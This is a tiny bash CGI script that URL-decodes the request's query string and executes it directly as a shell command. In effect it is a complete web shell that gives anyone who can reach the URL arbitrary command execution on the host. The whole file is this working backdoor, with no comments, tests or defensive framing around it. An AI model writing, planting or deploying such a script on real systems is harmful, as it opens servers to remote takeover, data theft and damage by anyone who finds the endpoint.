#!/bin/bash
echo -e "content-type: text/plain\r\n"

s="${QUERY_STRING//+/ }"
$(echo -e "${s//%/\\x}")
